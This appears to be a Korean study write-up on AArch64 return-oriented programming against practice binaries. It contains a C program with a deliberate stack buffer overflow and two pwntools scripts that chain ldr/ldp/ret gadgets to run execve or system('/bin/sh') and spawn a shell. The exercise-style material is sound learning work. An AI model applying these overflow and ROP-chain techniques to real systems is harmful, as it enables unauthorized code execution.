우리는 chaining을 함에 있어서 MOV, LDR, LDP 가젯을 사용한다.
```
MOV r1,m           : r1 = m
LDR r1, [r2. #16]  : r2에 16바이트 더한 주소에 값을 읽어와 r1에 저장한다.
LDP r1, r2, [addr] : addr주소에 r1,r2 를 저장한다.
```
LDR은 불러오는 변수의 크기에 따라 LDRB, LDRH, LDR로 나뉜다.
LDR은 int, B는 byte, H는 short 이다.

예제 문제를 풀어보면서 알잘딱을 해보자

SP랑 x29는 항상 같은 값인데 왜 두개 다 있는걸까
strings로 뭐 찾는데 0xaaa 이렇게 3글자가 나오면 보통은 0x400aaa 이런거임. 왜인지는 모름

아 맞다 sp 업데이트 되지
그냥 ldr은 업데이트 안되는듯

```c
#include <stdio.h>

char *sh = "/bin/sh";

void gadget(){
        asm("ldr x0, [sp]");
        asm("ldr x1, [sp, #8]");
        asm("ldr x2, [sp, #16]");
        asm("ldr x30, [sp, #24]");
        asm("ret");
        execve("/bin/ls", 0, 0);
}

void setup_environment() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

int getstring(){
        char buf[0x30];
        printf("insert >> ");
        read(0, buf, 0x100);
        return 0;
}

int main(){
        setup_environment();
        printf("please chaining\n");
        getstring();
        return 0;
}
```

```python
from pwn import *

#p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g", "8888", "./chain"])
p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "./chain"])

x0_1_2_30_ret = 0x40078c
execve = 0x0000000000400650
binsh = 0x00000000004008b0

ex = b'a'*48
ex += b'b'*0x8
ex += p64(x0_1_2_30_ret)
ex += p64(binsh)
ex += p64(0)
ex += p64(0)
ex += p64(execve)

pause()

p.sendlineafter(b"insert >> ", ex)

p.interactive()
```

![](https://i.imgur.com/4fiN28E.png)

캬
이제 exploitable 인가 그거만 풀면 될 듯

![](https://i.imgur.com/DwcL8PF.png)

![](https://i.imgur.com/m9PK14q.png)

basic overflow 이다.
가젯은 ROPgadget으로 찾으면 되고 system 함수와 ldr x0 , ldr x30 , ret 가젯을 찾았다.
![](https://i.imgur.com/1a2oe9b.png)
```python
from pwn import *

e = ELF("./Exploitable")
p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "./Exploitable"])
# p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g", "8888", "./Exploitable"])
binsh_addr = next(e.search(b"/bin/sh\x00"))

system_add = 0x400714
# x0 에 /bin/sh 만 넣고 system_add 실행하면 될 듯
# 그러면 찾아야 할건 ldr x0  sp, ldp x30 sp , ret 요거인듯
# 여기서 ret에 system_add 넣으면 될 듯
gadget = 0x0000000000400724
#  : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret
# sp가 0x10 높아짐

ex = b'a'*0x20
ex += b'b'*0x8
ex += p64(gadget)
ex += b'd'*0x18
ex += p64(system_add)
ex += b'e'*0x8
ex += p64(binsh_addr)

p.sendlineafter(b"...\n", ex)

p.interactive()

```
살짝 감 잡았다.
그냥 ret chaining은 그냥 함수에 있는거 가져다 쓰면 그만이고 x0, x1, x2 같은 가젯이 문제네.

![](https://i.imgur.com/PfXE29p.png)

